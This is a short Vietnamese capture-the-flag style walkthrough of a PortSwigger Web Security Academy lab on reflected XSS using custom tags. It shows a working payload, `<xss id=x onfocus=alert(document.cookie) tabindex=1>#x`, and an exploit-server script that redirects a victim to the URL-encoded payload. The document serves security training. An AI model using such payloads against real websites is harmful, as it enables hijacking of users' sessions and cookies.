# Yêu cầu: Tấn công XSS vs hàm tùy chỉnh và tự động gọi ra `document.cookie`

Lab bảo chúng ta dùng `custom tags` để tấn công để chú ý tới hành động bên trong thẻ. 

![image](https://user-images.githubusercontent.com/72268643/150621172-632ea6bc-0865-463f-89d5-9a4c428d1017.png)

`/?search=<xss+id=x+onfocus=alert(document.cookie)+tabindex=1>#x` (`tabindex=1` để ưu tiên cho đoạn code được thực thi)

Tiếp đến, Exploit server vào sử dụng đoạn code dưới dạng URL encode.

![image](https://user-images.githubusercontent.com/72268643/150622129-ac8dff2f-5345-4807-9dad-60433894fc4d.png)

`<script>
location = 'https://acac1fef1e50b4c5c0c75b6d0045001d.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex%3D1%3E%23x';
</script>`

Store và Deliver exploit to victim để hoàn thành lab 
